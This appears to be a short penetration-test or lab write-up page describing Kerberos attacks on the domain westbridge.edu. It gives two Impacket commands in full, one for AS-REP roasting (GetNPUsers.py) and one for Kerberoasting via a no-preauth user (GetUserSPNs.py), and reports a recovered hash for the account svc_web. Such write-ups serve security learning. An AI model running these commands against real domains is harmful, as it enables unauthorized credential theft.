# AS Requested Service Tickets

### We Performed AS-REP Roasting Against Domain Users

{% code overflow="wrap" %}
```bash
GetNPUsers.py 'westbridge.edu'/ -usersfile 'westbridge_rid_users.txt' -dc-ip 192.168.178.82 -no-pass
```
{% endcode %}

We see j.bennet, but hash not crackable

<figure><img src="../../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

## We Enumerated Service Accounts and Requested Kerberos Service Tickets

{% code overflow="wrap" %}
```bash
GetUserSPNs.py -no-preauth j.bennett -usersfile westbridge_rid_users.txt -dc-host 192.168.178.82 westbridge.edu/
```
{% endcode %}

We got hash off user svc\_web

<figure><img src="../../../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
